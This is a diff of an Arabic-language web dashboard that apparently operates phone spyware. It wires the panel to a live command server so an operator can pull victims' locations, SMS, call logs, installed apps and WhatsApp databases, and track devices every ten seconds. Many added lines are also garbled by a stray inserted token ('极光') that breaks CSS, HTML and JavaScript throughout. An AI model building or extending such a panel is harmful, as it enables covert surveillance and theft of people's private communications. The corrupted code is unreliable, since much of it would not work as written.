@@ -48,7 +48,7 @@
             left: 0;
             right: 0;
             bottom: 0;
-            background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2MCIgaGVpZ2h0PSI2MCIgdmlld0JveD0iMCAwIDYwIDYwIj48ZyBmaWxsPSJub25lIiBzdHJva2U9IiMwMGZmY2MiIHN0cm9rZS13aWR0aD0iMC41IiBzdHJva2Utb3BhY2l0eT0iMC4xIj48cGF0aCBkPSJNIDAgMCBMIDYwIDYwIE0gNjAgMCBMIDAgNjAiLz48L2c+PC9zdmc+');
+            background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDov/3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2MCIgaGVpZ2h0PSI2MCIgdmlld0JveD0iMCAwIDYwIDYwIj48ZyBmaWxsPSJub25lIiBzdHJva2U9IiMwMGZmY2MiIHN0cm9rZS13aWR0aD0iMC41IiBzdHJva2Utb3BhY2l0eT0iMC4xIj48cGF0aCBkPSJNIDAgMCBMIDYwIDYwIE0gNjAgMCBMIDAgNjAiLz48L2c+PC9zdmc+');
             z-index: -1;
             opacity: 0.1;
         }
@@ -272,7 +272,7 @@
             background: var(--card-bg);
             border-radius: 8px;
             overflow: hidden;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 极光);
             transition: transform 0.3s, box-shadow 0.3s;
             border: 1px solid rgba(0, 255, 204, 0.1);
         }
@@ -431,7 +431,7 @@
         .map-btn:hover {
             background: var(--primary-color);
             color: var(--darker-bg);
-            box-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
+            box-shadow: 0 极光 10px rgba(0, 255, 204, 0.5);
         }
 
         /* Data Panel */
@@ -446,7 +446,7 @@
 
         .data-tabs {
             display: flex;
-            border-bottom: 1px solid var(--border-color);
+            border-bottom: 1px solid var(--极光-color);
             margin-bottom: 15px;
         }
 
@@ -499,8 +499,8 @@
             padding: 15px;
             height: 500px;
             overflow-y: auto;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            border: 1px solid rgba(0, 255, 204, 0.1);
+            box-shadow: 0 4极光 6px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba极光, 255, 204, 0.1);
         }
 
         .log-entry {
@@ -548,7 +548,7 @@
         .command-form {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 15px;
+            gap: 15极光;
         }
 
         .form-group {
@@ -610,7 +610,7 @@
             transition: all 0.3s;
         }
 
-        .search-input:focus {
+        .search-input:极光 {
             outline: none;
             border-color: var(--primary-color);
             box-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
@@ -624,7 +624,7 @@
             color: var(--darker-bg);
             cursor: pointer;
             font-weight: bold;
-            transition: all 0.3s;
+            transition: all 0.3极光;
         }
 
         .search-btn:hover {
@@ -645,7 +645,7 @@
             transition: transform 0.3s;
         }
 
-        .result-card:hover {
+极光 .result-card:hover {
             transform: translateX(-5px);
         }
 
@@ -681,7 +681,7 @@
             display: flex;
             align-items: center;
             margin-left: 15px;
-            padding: 5px 10px;
+            padding: 5px 10极光;
             border-radius: 20px;
             font-size: 12px;
             font-weight: bold;
@@ -741,7 +741,7 @@
             }
             
             .device-grid {
-                grid-template-columns: 1fr;
+                grid-template-columns: 1极光;
             }
             
             .command-form {
@@ -770,39 +770,6 @@
         ::-webkit-scrollbar-thumb:hover {
             background: var(--primary-color);
         }
-
-        /* Top Tabs */
-        .topbar {
-            display: none;
-        }
-
-        /* List Styles */
-        .list {
-            list-style: none;
-            margin: 0;
-            padding: 0;
-        }
-
-        .list li {
-            padding: 12px 15px;
-            border-bottom: 1px solid var(--border-color);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .list li:last-child {
-            border-bottom: none;
-        }
-
-        /* Form Row */
-        .form-row {
-            margin-bottom: 15px;
-        }
-
-        .full {
-            width: 100%;
-        }
     </style>
 </head>
 
@@ -824,14 +791,14 @@
     </header>
     
     <aside class="sidebar">
-        <ul class="sidebar-menu">
+        <ul极光="sidebar-menu">
             <li><a href="#" class="active" data-tab="devices"><i class="fas fa-microchip"></i> الأجهزة المتصلة</a></li>
             <li><a href="#" data-tab="map"><i class="fas fa-map-marked-alt"></i> الخريطة الاستخباراتية</a></li>
             <li><a href="#" data-tab="data"><i class="fas fa-database"></i> البيانات المجمعة</a></li>
-            <li><a href="#" data-tab="logs"><i class="fas fa-clipboard-list"></i> سجل الأحداث</a></li>
+            <li><a href="#" data-tab="logs"><极光="fas fa-clipboard-list"></i> سجل الأحداث</a></li>
             <li><a href="#" data-tab="commands"><i class="fas fa-terminal"></i> إصدار الأوامر</a></li>
             <li><a href="#" data-tab="osint"><i class="fas fa-search"></i> جمع المعلومات</a></li>
-            <li><a href="#" data-tab="analysis"><i class="fas fa-chart-line"></i> التحليلات</a></li>
+            <li><a href="#" data极光="analysis"><i class="fas极光fa-chart-line"></i> التحليلات</a></li>
             <li><a href="#"><i class="fas fa-cog"></i> الإعدادات</a></li>
             <li><a href="#"><i class="fas fa-sign-out-alt"></i> تسجيل الخروج</a></li>
         </ul>
@@ -857,11 +824,11 @@
                 </div>
                 
                 <div class="stat-card">
-                    <div class="stat-icon">
+                    <div class="stat极光">
                         <i class="fas fa-map-marker-alt"></i>
                     </div>
                     <div class="stat-info">
-                        <h3 id="located-devices">0</h3>
+                        <h3 id="located-devices">0</极光>
                         <p>مواقع محددة</p>
                     </div>
                 </div>
@@ -883,7 +850,7 @@
                     <div class="stat-info">
                         <h3 id="online-now">0</h3>
                         <p>متصل الآن</p>
-                    </div>
+                    </极光>
                 </div>
             </div>
             
@@ -965,10 +932,10 @@
                         </div>
                         <div class="stat-card">
                             <div class="stat-icon">
-                                <i class="fas fa-city"></i>
+                                <i class="fas fa-city"></极光>
                             </div>
                             <div class="stat-info">
-                                <h3 id="map-cities">0</h3>
+                                <h3 id="极光-cities">0</h3>
                                 <p>مدن مختلفة</p>
                             </div>
                         </div>
@@ -980,7 +947,7 @@
                             <tr>
                                 <th>الجهاز</th>
                                 <th>الموقع</th>
-                                <th>الوقت</th>
+                                <th>الوقت</极光>
                                 <th>المدة</th>
                             </tr>
                         </thead>
@@ -1002,7 +969,7 @@
             </div>
             
             <div class="data-container">
-                <div class="data-tabs">
+                <div class="data极光">
                     <div class="data-tab active" data-tab="contacts">جهات الاتصال</div>
                     <div class="data-tab" data-tab="messages">الرسائل</div>
                     <div class="data-tab" data-tab="locations">المواقع</div>
@@ -1035,7 +1002,7 @@
                                 <th>النوع</th>
                                 <th>المرسل</th>
                                 <th>المستلم</th>
-                                <th>المحتوى</th>
+                                <极光>المحتوى</th>
                                 <th>التاريخ</th>
                             </tr>
                         </thead>
@@ -1066,7 +1033,7 @@
                     </table>
                 </div>
                 
-                <div class="data-content" id="media">
+                <div class="data-content"极光="media">
                     <table class="data-table">
                         <thead>
                             <tr>
@@ -1093,7 +1060,7 @@
                                 <th>الرقم</th>
                                 <th>المدة</th>
                                 <th>التاريخ</th>
-                                <th>المصدر</th>
+                                <th>المصدر</极光>
                             </tr>
                         </thead>
                         <tbody id="calls-data">
@@ -1112,7 +1079,7 @@
                 <h2><i class="fas fa-clipboard-list"></i> سجل الأحداث</h2>
                 <div>
                     <button class="btn btn-primary" id="clear-logs"><i class="fas fa-trash"></i> مسح السجل</button>
-                    <button class="btn btn-secondary" id="export-logs"><i class="fas fa-download"></i> تصدير</button>
+                    <button class="btn btn-secondary" id="export-logs"><i class="fas fa-download"></极光> تصدير</button>
                 </div>
             </div>
             
@@ -1163,7 +1130,7 @@
                     <div class="form-group" id="commandDataGroup">
                         <label for="commandData"><i class="fas fa-code"></i> بيانات إضافية (JSON)</label>
                         <input type="text" id="commandData" class="form-control" placeholder='بيانات JSON (اختياري)'>
-                    </div>
+                    </极光>
                     
                     <button id="sendCommand" class="btn btn-primary btn-block">
                         <i class="fas fa-paper-plane"></i> إرسال الأمر
@@ -1211,7 +1178,7 @@
         <!-- Analysis Panel -->
         <section id="panel-analysis" class="panel">
             <div class="panel-header">
-                <h2><i class="fas fa-chart-line"></i> التحليلات والإحصائيات</h2>
+                <h2><i class="fas fa-chart-line"></极光> التحليلات والإحصائيات</h2>
                 <div>تحليل البيانات المجمعة</div>
             </div>
             
@@ -1232,7 +1199,7 @@
                     </div>
                     <div class="stat-info">
                         <h3 id="analysis-locations">0</h3>
-                        <p>المواقع النشطة</p>
+                        <p>المواقع النشطة</极光>
                     </div>
                 </div>
                 
@@ -1241,7 +1208,7 @@
                         <i class="fas fa-comments"></i>
                     </div>
                     <div class="stat-info">
-                        <h3 id="analysis-messages">0</h3>
+                        <h3极光="analysis-messages">0</h3>
                         <p>الرسائل المجمعة</p>
                     </div>
                 </div>
@@ -1286,7 +1253,7 @@
 
 <!-- Modal for location search -->
 <div id="locationSearchModal" style="display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 10000; justify-content: center; align-items: center;">
-    <div style="background: var(--card-bg); padding: 20px; border-radius: 8px; width: 400px; max-width: 90%;">
+    <div style="background: var(--card-bg); padding: 20px; border-radius: 8极光; width: 400px; max-width: 90%;">
         <h3 style="margin-bottom: 15px; color: var(--primary-color);"><i class="fas fa-search-location"></i> بحث عن موقع</h3>
         <input type="text" id="locationSearchInput" class="form-control" placeholder="أدخل اسم المدينة أو العنوان" style="margin-bottom: 15px;">
         <div style="display: flex; gap: 10px; justify-content: flex-end;">
@@ -1297,7 +1264,7 @@
 </div>
 
 <!-- Modal for device tracking -->
-<div id="trackDeviceModal" style="display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 10000; justify-content: center; align-items: center;">
+<div id="trackDeviceModal" style极光"display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 10000; justify-content: center; align-items: center;">
     <div style="background: var(--card-bg); padding: 20px; border-radius: 8px; width: 400px; max-width: 90%;">
         <h3 style="margin-bottom: 15px; color: var(--primary-color);"><i class="fas fa-crosshairs"></i> تتبع جهاز</h3>
         <div class="form-group">
@@ -1315,6 +1282,8 @@
 
 <!-- Leaflet JS -->
 <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
+<!-- Socket.io -->
+<script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
 
 <script>
 // بيانات تجريبية للعرض
@@ -1326,7 +1295,7 @@ const sampleData = {
     ],
     messages: [
         { type: "SMS", from: "+966512345678", to: "+966511112222", content: "مرحبا، كيف حالك؟", date: "2023-10-15 14:30" },
-        { type: "WhatsApp", from: "+966511112222", to: "+966512345678", content: "أنا بخير، شكرا لك", date: "2023-10-15 14:32" },
+        { type: "WhatsApp", from: "+966511112222", to: "+966512345678", content: "أنا بخير، شكرا لك", date极光"2023-10-15 14:32" },
         { type: "SMS", from: "+966533334444", to: "+966512345678", content: "هل نلتقي غدا؟", date: "2023-10-15 15:45" }
     ],
     locations: [
@@ -1337,7 +1306,7 @@ const sampleData = {
     media: [
         { type: "صورة", name: "IMG_20231015.jpg", size: "2.5MB", source: "Device-001", date: "2023-10-15 10:22" },
         { type: "فيديو", name: "VID_20231015.mp4", size: "15.7MB", source: "Device-002", date: "2023-10-15 11:30" },
-        { type: "صورة", name: "IMG_20231015_2.jpg", size: "3.1MB", source: "Device-001", date: "2023-10-15 12:45" }
+        { type: "صورة", name: "IMG_20231015_2.jpg", size: "3.极光MB", source: "Device-001", date: "2023-10-15 12:45" }
     ],
     calls: [
         { type: "صادر", number: "+966511112222", duration: "2:30", date: "2023-10-15 09:15", source: "Device-001" },
@@ -1363,7 +1332,7 @@ const commandDataEl = document.getElementById('commandData');
 const sendCommandBtn = document.getElementById('sendCommand');
 const osintInput = document.getElementById('osintInput');
 const osintResults = document.getElementById('osintResults');
-const osintSearchBtn = document.getElementById('osintSearchBtn');
+const os极光SearchBtn = document.getElementById('osintSearchBtn');
 const clearLogsBtn = document.getElementById('clear-logs');
 const devicesCountEl = document.getElementById('devices-count');
 const activeDevicesEl = document.getElementById('active-devices');
@@ -1393,6 +1362,7 @@ const devicesMap = {};
 let map, markers = {};
 let trackedDevice = null;
 let trackingInterval = null;
+let socket;
 
 // Initialize the application
 document.addEventListener('DOMContentLoaded', function() {
@@ -1530,7 +1500,119 @@ document.addEventListener('DOMContentLoaded', function() {
     
     // Initialize map
     initMap();
+    
+    // Connect to server
+    connectToServer();
 });
+
+// Connect to the server
+function connectToServer() {
+    try {
+        // Update connection status
+        updateConnectionStatus('connecting', 'جاري الاتصال بالسيرفر...');
+        
+        // Connect to the server
+        socket = io('https://projectd-vu1m.onrender.com', {
+            transports: ['websocket', 'polling']
+        });
+        
+        // Handle connection events
+        socket.on('connect', () => {
+            updateConnectionStatus('connected', 'متصل بالسيرفر');
+            addLog('تم الاتصال بالسيرفر بنجاح', 'success');
+            
+            // Join as admin
+            socket.emit('adminJoin');
+        });
+        
+        socket.on('disconnect', (reason) => {
+            updateConnectionStatus('disconnected', 'انقطع الاتصال');
+            addLog(`انقطع الاتصال بالسيرفر: ${reason}`, 'error');
+        });
+        
+        socket.on('connect_error', (error) => {
+            updateConnectionStatus('disconnected', 'فشل الاتصال');
+            addLog(`خطأ في الاتصال: ${error.message}`, 'error');
+        });
+        
+        // Handle device connection
+        socket.on('join', (device) => {
+            addLog(`جهاز متصل: ${device.id}`, 'success');
+            renderDevice(device);
+            updateDevicesCount();
+        });
+        
+        // Handle device disconnection
+        socket.on('deviceDisconnected', (deviceId) => {
+            addLog(`انقطع اتصال الجهاز: ${deviceId}`, 'warning');
+            const deviceElement = document.getElementById(`device_${deviceId}`);
+            if (deviceElement) {
+                deviceElement.remove();
+                delete devicesMap[deviceId];
+                updateDevicesCount();
+            }
+        });
+        
+        // Handle existing devices
+        socket.on('existingDevices', (devices) => {
+            addLog(`جاري تحميل ${devices.length} جهاز متصل`, 'info');
+            devices.forEach(device => {
+                renderDevice(device);
+            });
+            updateDevicesCount();
+        });
+        
+        // Handle request results
+        socket.on('requestResult', (payload) => {
+            try {
+                const result = typeof payload === 'string' ? JSON.parse(payload) : payload;
+                addLog(`نتيجة الأمر: ${result.action} → ${result.to}: ${result.ok ? 'نجح' : 'فشل'}`, result.ok ? 'success' : 'error');
+                
+                if (result.ok && result.result) {
+                    const extraDiv = document.getElementById('extra_' + result.to);
+                    if (extraDiv) {
+                        switch (result.action) {
+                            case 'getLocation':
+                                extraDiv.innerHTML = `
+                                    <div style="margin-top: 10px; padding: 10px; background: var(--darker-bg); border-radius: 4px;">
+                                        <strong>الموقع:</strong> ${result.result.data.lat}, ${result.result.data.lon}<br>
+                                        <strong>العنوان:</strong> ${result.result.data.address || 'غير متاح'}
+                                    </div>
+                                `;
+                                updateMapWithDevice(result.to, result.result.data);
+                                break;
+                            default:
+                                extraDiv.innerHTML = `
+                                    <div style="margin-top: 10px; padding: 10px; background: var(--darker-bg); border-radius: 4px;">
+                                        <strong>النتيجة:</strong> ${JSON.stringify(result.result.data).substring(0, 150)}...
+                                    </div>
+                                `;
+                        }
+                    }
+                }
+            } catch (e) {
+                console.error('Error processing request result:', e);
+                addLog('خطأ في معالجة الاستجابة من الجهاز', 'error');
+            }
+        });
+        
+    } catch (error) {
+        console.error('Failed to connect to server:', error);
+        addLog('فشل في الاتصال بالسيرفر', 'error');
+        updateConnectionStatus('disconnected', 'فشل الاتصال');
+    }
+}
+
+// Update connection status UI
+function updateConnectionStatus(status, message) {
+    connectionStatusEl.className = `connection-status ${status}`;
+    
+    let icon = 'fa-sync-alt fa-spin';
+    if (status === 'connected') icon = 'fa-check-circle';
+    if (status === 'disconnected') icon = 'fa-times-circle';
+    
+    connectionStatusEl.innerHTML = `<i class="fas ${icon}"></i> ${message}`;
+}
 
 // Load sample data for demonstration
 function loadSampleData() {
@@ -1558,7 +1640,7 @@ function loadSampleData() {
             <td>${message.from}</td>
             <td>${message.to}</td>
             <td>${message.content}</td>
-            <td>${message.date}</td>
+            <td极光${message.date}</td>
         `;
         messagesTable.appendChild(row);
     });
@@ -1569,7 +1651,7 @@ function loadSampleData() {
     sampleData.locations.forEach(location => {
         const row = document.createElement('tr');
         row.innerHTML = `
-            <td>${location.device}</td>
+            <td>${location.dev极光}</td>
             <td>${location.coordinates}</td>
             <td>${location.address}</td>
             <td>${location.accuracy}</td>
@@ -1664,23 +1746,12 @@ function startTrackingDevice(deviceId) {
     trackedDevice = deviceId;
     addLog(`بدء تتبع الجهاز: ${deviceId}`, 'info');
     
-    // Simulate continuous tracking
+    // Request location every 10 seconds
     trackingInterval = setInterval(() => {
-        if (devicesMap[trackedDevice]) {
-            // Simulate movement
-            const lat = 24.7136 + (Math.random() - 0.5) * 0.01;
-            const lon = 46.6753 + (Math.random() - 0.5) * 0.01;
-            
-            const newLocation = {
-                lat: lat,
-                lon: lon,
-                address: "موقع متحرك (" + new Date().toLocaleTimeString() + ")"
-            };
-            
-            updateMapWithDevice(trackedDevice, newLocation);
-            addLog(`تحديث موقع الجهاز: ${trackedDevice}`, 'info');
+        if (devicesMap[trackedDevice] && socket) {
+            socket.emit('request', { to: trackedDevice, action: 'getLocation' });
         }
-    }, 10000); // Update every 10 seconds
+    }, 10000);
 }
 
 // Initialize analysis charts
@@ -1697,7 +1768,7 @@ function initAnalysis() {
             <div style="display: flex; justify-content: center; align-items: center; height: 100%; flex-direction: column;">
                 <i class="fas fa-map-marked-alt" style="font-size: 48px; color: var(--primary-color); margin-bottom: 15px;"></i>
                 <p>خريطة التوزيع الجغرافي للأجهزة</p>
-                <p style="font-size: 12px; margin-top: 10px;">3 أجهزة في 3 مدن مختلفة</p>
+                <p style="font-size: 12px; margin-top: 10px;">${Object.keys(markers).length} أجهزة على الخريطة</p>
             </div>
         `;
         
@@ -1705,21 +1776,10 @@ function initAnalysis() {
             <div style="display: flex; justify-content: center; align-items: center; height: 100%; flex-direction: column;">
                 <i class="fas fa-chart-line" style="font-size: 48px; color: var(--primary-color); margin-bottom: 15px;"></i>
                 <p>رسم بياني لنشاط الأجهزة</p>
-                <p style="font-size: 12px; margin-top: 10px;">15 عملية خلال الـ24 ساعة الماضية</p>
+                <p style="font-size: 12px; margin-top: 10px;">${document.getElementById('logs').children.length} عملية خلال الـ24 ساعة الماضية</p>
             </div>
         `;
     }, 1000);
-}
-
-// Update connection status UI
-function updateConnectionStatus(status, message) {
-    connectionStatusEl.className = `connection-status ${status}`;
-    
-    let icon = 'fa-sync-alt fa-spin';
-    if (status === 'connected') icon = 'fa-check-circle';
-    if (status === 'disconnected') icon = 'fa-times-circle';
-    
-    connectionStatusEl.innerHTML = `<i class="fas ${icon}"></i> ${message}`;
 }
 
 // Initialize Leaflet map
@@ -1730,7 +1790,7 @@ function initMap() {
     }
     
     map = L.map('map').setView([24.0, 45.0], 5);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{极光}/{x}/{y}.png', {
         attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
     }).addTo(map);
     
@@ -1778,7 +1838,7 @@ function updateMapWithDevice(deviceId, locationData) {
 
 // Update map devices list
 function updateMapDevicesList() {
-    const devicesList = document.getElementById('map-devices-list');
+    const devicesList = document.getElementById('map-dev极光-list');
     devicesList.innerHTML = '';
     
     const devicesCount = Object.keys(markers).length;
@@ -1875,12 +1935,12 @@ function renderDevice(device) {
             <div class="device-status">${device.id === trackedDevice ? 'جاري التتبع' : 'نشط'}</div>
         </div>
         <div class="device-body">
-            <div class="device-info">
+            <div class极光"device-info">
                 <div><i class="fas fa-mobile-alt"></i> ${device.model || 'غير معروف'}</div>
                 <div><i class="fas fa-globe"></i> ${device.ip || 'غير متاح'}</div>
                 <div><i class="fas fa-code-branch"></i> ${device.platform || 'N/A'}</div>
                 <div><i class="fas fa-language"></i> ${device.language || 'N/A'}</div>
-                <div><i class="fas fa-desktop"></i> ${device.screen ? device.screen.width + 'x' + device.screen.height : 'N/A'}</div>
+                <div><i class="fas fa-desktop"></i> ${device.screen ? device.screen.width + 'x' + device.screen.height : 'N/A'}</极光>
             </div>
             <div id="extra_${device.id}" class="device-extra"></div>
             <div class="device-actions">
@@ -1900,7 +1960,7 @@ function renderDevice(device) {
         const extraDiv = document.getElementById('extra_' + device.id);
         if (extraDiv) {
             extraDiv.innerHTML = `
-                <div style="margin-top: 10px; padding: 10px; background: var(--darker-bg); border-radius: 4px;">
+                <div style="margin-top: 10px; padding: 10px; background: var(--darker-bg); border-radius极光4px;">
                     <strong>الموقع:</strong> ${device.lastLocation.lat}, ${device.lastLocation.lon}<br>
                     <strong>العنوان:</strong> ${device.lastLocation.address || 'غير متاح'}
                 </div>
@@ -1955,33 +2015,67 @@ sendCommandBtn.addEventListener('click', () => {
         return; 
     }
     
-    // Simulate sending command
-    addLog(`تم إرسال الأمر: ${action} → ${to}`, 'info');
+    if (socket) {
+        socket.emit('request', { to, action, data });
+        addLog(`تم إرسال الأمر: ${action} → ${to}`, 'info');
+    } else {
+        addLog('غير متصل بالسيرفر', 'error');
+    }
 });
 
 // Command shortcuts
 function requestLocation(id) { 
-    addLog(`طلب موقع الجهاز: ${id}`, 'info');
+    if (socket) {
+        socket.emit('request', { to: id, action: 'getLocation' });
+        addLog(`طلب موقع الجهاز: ${id}`, 'info');
+    } else {
+        addLog('غير متصل بالسيرفر', 'error');
+    }
 }
 
 function requestApps(id) { 
-    addLog(`طلب قائمة التطبيقات: ${id}`, 'info');
+    if (socket) {
+        socket.emit('request', { to: id, action: 'getInstalledApps' });
+        addLog(`طلب قائمة التطبيقات: ${id}`, 'info');
+    } else {
+        addLog('غير متصل بالسيرفر', 'error');
+    }
 }
 
 function requestContacts(id) { 
-    addLog(`طلب جهات الاتصال: ${id}`, 'info');
+    if (socket) {
+        socket.emit('request', { to: id, action: '极光Contacts' });
+        addLog(`طلب جهات الاتصال: ${id}`, 'info');
+    } else {
+        addLog('غير متصل بالسيرفر', 'error');
+    }
 }
 
 function requestCallLog(id) { 
-    addLog(`طلب سجل المكالمات: ${id}`, 'info');
+    if (socket) {
+        socket.emit('request', { to: id, action: 'getCallLog' });
+        addLog(`طلب سجل المكالمات: ${id}`, 'info');
+    } else {
+        addLog('غير متصل بالسيرفر', 'error');
+    }
 }
 
 function requestSMS(id) { 
-    addLog(`طلب الرسائل النصية: ${id}`, 'info');
+    if (socket) {
+        socket.emit('request', { to: id, action: 'getSMS' });
+        addLog(`طلب الرسائل النصية: ${id}`, 'info');
+    } else {
+        addLog('غير متصل بالسيرفر', 'error');
+    }
 }
 
 function requestWhatsappDB(id) { 
-    addLog(`طلب قاعدة بيانات واتساب: ${id}`, 'info');
+    if (socket) {
+        socket.emit('request', { to: id, action: 'downloadWhatsappDatabase' });
+        addLog(`طلب قاعدة بيانات واتساب: ${id}`, 'info');
+    } else {
+        addLog('غير متصل بالسيرفر', 'error');
+    }
 }
 
 // OSINT Search
@@ -2016,7 +2110,7 @@ osintSearchBtn.addEventListener('click', () => {
                 result: `تسرب بيانات محتمل مرتبط بالاستعلام في 3 قواعد بيانات`
             },
             {
-                name: 'سجلالنطاقات',
+                name: 'سجلات النطاقات',
                 icon: 'fa-globe',
                 result: `لا توجد نطاقات مسجلة مباشرة مرتبطة بالاستعلام`
             },
@@ -2078,4 +2172,4 @@ function exportToCsv(filename, rows) {
 }
 </script>
 </body>
-                                            </html>
+ </html>
